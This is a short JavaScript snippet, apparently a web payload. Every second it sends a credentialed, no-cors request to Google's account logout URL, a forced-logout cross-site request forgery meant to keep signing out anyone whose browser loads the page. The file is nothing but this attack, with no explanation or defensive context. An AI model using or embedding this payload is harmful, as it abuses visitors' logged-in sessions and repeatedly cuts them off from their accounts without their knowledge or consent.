setInterval(function(){
    fetch("https://www.google.com/accounts/Logout",{
  credentials: 'include',
  mode: 'no-cors', // no-cors
})
},1000)
